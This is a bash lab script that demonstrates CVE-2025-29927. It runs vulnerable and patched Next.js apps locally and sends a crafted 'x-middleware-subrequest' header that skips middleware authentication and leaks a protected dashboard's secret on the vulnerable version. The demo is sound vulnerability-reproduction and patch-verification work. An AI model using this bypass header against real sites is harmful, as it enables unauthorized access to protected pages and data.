#!/usr/bin/env bash
# Reproducible demo for CVE-2025-29927. Boots the real vulnerable and patched
# Next.js apps and shows the middleware authorization bypass before, blocked after.
# LOCAL LAB ONLY. Requires Node 18+ and network access to npm (first run).
set -euo pipefail
cd "$(dirname "$0")/labs"
HDR='x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware'

run_app() {  # name dir port
  local name=$1 dir=$2 port=$3
  (cd "$dir" && [ -d node_modules ] || npm install --no-audit --no-fund >/dev/null 2>&1)
  (cd "$dir" && [ -d .next ] || npx next build >/dev/null 2>&1)
  (cd "$dir" && npx next start -p "$port" >/tmp/$name.log 2>&1 &) 
  for _ in $(seq 1 60); do curl -s -o /dev/null "http://127.0.0.1:$port/" && break; sleep 1; done
}

echo "Starting vulnerable (next@14.2.24) on :3001 and patched (next@14.2.25) on :3002..."
run_app vuln vulnerable-app 3001
run_app patched patched-app 3002

echo; echo "== VULNERABLE =="
echo "-- no header (auth enforced):"
curl -s -o /dev/null -w "   HTTP %{http_code} -> %{redirect_url}\n" http://127.0.0.1:3001/dashboard
echo "-- WITH bypass header:"
curl -s -H "$HDR" http://127.0.0.1:3001/dashboard | grep -oE 'PROTECTED DASHBOARD|SECRET:[^<]*' | sed 's/^/   LEAKED: /'

echo; echo "== PATCHED =="
echo "-- WITH the same bypass header:"
curl -s -o /dev/null -w "   HTTP %{http_code} -> %{redirect_url}\n" -H "$HDR" http://127.0.0.1:3002/dashboard

echo; echo "Done. Stop the servers with: pkill -f 'next start'"
